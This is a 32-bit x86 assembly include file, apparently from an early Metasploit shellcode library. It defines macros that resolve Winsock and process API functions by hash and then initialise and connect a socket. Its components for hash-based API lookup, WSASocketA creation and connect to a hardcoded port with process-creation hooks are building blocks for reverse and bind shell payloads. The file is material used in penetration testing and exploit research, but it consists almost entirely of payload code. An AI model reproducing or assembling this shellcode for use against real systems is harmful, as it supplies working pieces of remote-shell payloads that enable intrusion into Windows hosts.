;      Title:  Win32 Socket Initialization
;  Platforms:  Windows NT 4.0, Windows 2000, Windows XP, Windows 2003
;     Author:  hdm, spoonm


[BITS 32]

%include "_includes.asm"

%define _WSA_INIT_TABLE_BASE  12 ; [ebp + 12]
%xdefine _WSA_INIT_TABLE_IDX   _WSA_INIT_TABLE_BASE

%macro __TABLE_INC 0
  %xdefine _WSA_INIT_TABLE_IDX (_WSA_INIT_TABLE_IDX + 4)
%endmacro

%macro _WSA_INIT_TB_RECV 0
  HASH dd, 'recv'
  %xdefine FN_RECV [ebp + _WSA_INIT_TABLE_IDX]
  __TABLE_INC
%endmacro
%macro _WSA_INIT_TB_SEND 0
  HASH dd, 'send'
  %xdefine FN_SEND [ebp + _WSA_INIT_TABLE_IDX]
  __TABLE_INC
%endmacro
%macro _WSA_INIT_TB_ACCEPT 0
  HASH dd, 'accept'
  %xdefine FN_ACCEPT [ebp + _WSA_INIT_TABLE_IDX]
  __TABLE_INC
%endmacro
%macro _WSA_INIT_TB_BIND 0
  HASH dd, 'bind'
  %xdefine FN_BIND [ebp + _WSA_INIT_TABLE_IDX]
  __TABLE_INC
%endmacro
%macro _WSA_INIT_TB_LISTEN 0
  HASH dd, 'listen'
  %xdefine FN_LISTEN [ebp + _WSA_INIT_TABLE_IDX]
  __TABLE_INC
%endmacro
%macro _WSA_INIT_TB_CONNECT 0
  HASH dd, 'connect'
  %xdefine FN_CONNECT [ebp + _WSA_INIT_TABLE_IDX]
  __TABLE_INC
%endmacro
%macro _WSA_INIT_TB_WSASOCK 0
  HASH dd, 'WSASocketA'
  %xdefine FN_WSASOCK [ebp + _WSA_INIT_TABLE_IDX]
  __TABLE_INC
%endmacro
%macro _WSA_INIT_TB_WSASTART 0
  HASH dd, 'WSAStartup'
  %xdefine FN_WSASTART [ebp + _WSA_INIT_TABLE_IDX]
  __TABLE_INC
%endmacro
%macro _WSA_INIT_TB_CREATEPROCESS 0
  HASH dd, 'CreateProcessA'
  %xdefine FN_CREATEPROCESS [ebp + _WSA_INIT_TABLE_IDX]
  __TABLE_INC
%endmacro
%macro _WSA_INIT_TB_WAITSINGLEOBJECT 0
  HASH dd, 'WaitForSingleObject'
  %xdefine FN_WAITSINGLEOBJECT [ebp + _WSA_INIT_TABLE_IDX]
  __TABLE_INC
%endmacro
%macro _WSA_INIT_TB_EXITPROCESS 0
  HASH dd, 'ExitProcess'
  %xdefine FN_EXITPROCESS [ebp + _WSA_INIT_TABLE_IDX]
  __TABLE_INC
%endmacro


; define default if nothing already defined
%ifnmacro _WSA_INIT_TB
  %define _WSA_INIT_TBLEN 7   ; 7 entries
  %macro _WSA_INIT_TB 0
    _WSA_INIT_TB_RECV
    _WSA_INIT_TB_SEND
    _WSA_INIT_TB_ACCEPT
    _WSA_INIT_TB_BIND
    _WSA_INIT_TB_LISTEN
    _WSA_INIT_TB_WSASOCK
    _WSA_INIT_TB_WSASTART
  %endmacro
%endif

%ifndef _WSA_INIT_SOCKETTYPE
  %define _WSA_INIT_SOCKETTYPE 'tcp'
%endif




; sub esp, 0x100
; push edi    ; [ebp +  8] = LoadLibraryA
; push esi    ; [ebp +  4] = LGetProcAddress
; push ebx    ; [ebp +  0] = kernel32.dll base
          
; hash the functions defined by _WSA_HASH_TB
; expects:
;   cld (or sets it)
;   [ebp + 4] = LGetProcAddress
;   [ebp + 8] = LoadLibraryA
;   [ebp + 12] = space for address table
; preserves the stack, and ebp
%macro WSA_HASH_WINSOCK 0

  DIRECTION_CLD

  call LLoadWinsock
  
  LWSDataSegment:
  ;========================
  _WSA_INIT_TB
  db "WS2_32", 0x00
  ;========================
  
  LLoadWinsock:
      pop esi             ; save address to data in esi
  
                          ; push address of "WS2_32.DLL"
      lea eax, [esi + ( _WSA_INIT_TBLEN * 4)];
      push eax
      call [ebp + 8]      ; call LoadLibraryA("WS2_32.DLL")     
      xchg eax, ebx       ; store base of winsock in ebx
                          ; store base of function address table
      lea edi, [ebp + _WSA_INIT_TABLE_BASE]
  
                          ; load datalen number of functions by hash
      push BYTE _WSA_INIT_TBLEN
      pop ecx
  whash_looper:
      push ebx                    ; dll handle
      lodsd                       ; function hash value into eax, esi += 4
      push eax
      call [ebp + 4]              ; find the address
      stosd                       ; store address, edi += 4
      loop whash_looper
%endmacro

; expects:
;    [esp] = 0x190
;    [esp + 4] = space
;    FN_WSASTART = address to WSAStartupA
;    preserves everything except eax
%macro WSA_CALL_WSASTART 0
LWSAStartup:                    ; WSAStartup (0x190, DATA)
    call FN_WSASTART
%endmacro

; expects:
;   FN_WSASOCK = address to WSASocketA
; returns:
;   edi = socket
; preserves ebp, esp, ebx, esi
; preserves the stack
%macro WSA_CALL_SOCKET 1
    
  LWSASocketA:                         ; WSASocketA (2,type,0,0,0,0) 
      push eax
      push eax
      push eax
      push eax
  %if %1 == 'tcp'                      ; WSASocketA(2,1,0,0,0,0)
      inc eax
      push eax
      inc eax
      push eax
  %elif %1 == 'udp'                    ; WSASocketA(2,2,0,0,0,0)
      inc eax
      inc eax
      push eax
      push eax
  %endif
      call FN_WSASOCK
      xchg eax, edi                    ; load socket into edi
%endmacro

; expects:
;   edi = socket
;   FN_CONNECT = address to connect()
; returns:
;   result in eax
; preserves ebp, esp, ebx, esi
; preserves stack if %1 == 1
; %2 should be the ip (in string form.)
%macro WSA_CALL_CONNECT 2

LConnect:            ; connect(edi, sockaddr, 16)
    INET_ADDR {push dword}, %2
    push 0x11220002 ; port: 8721 
    mov ecx, esp
    push BYTE 0x10
    push ecx
    push dword edi
    call dword FN_CONNECT
%if %1 == 1 ; preserve stack, remove host and port
    pop ecx
    pop ecx
%endif
    
    ; reconnect on failure
    ; test eax, eax
    ; jne short LConnect

%endmacro
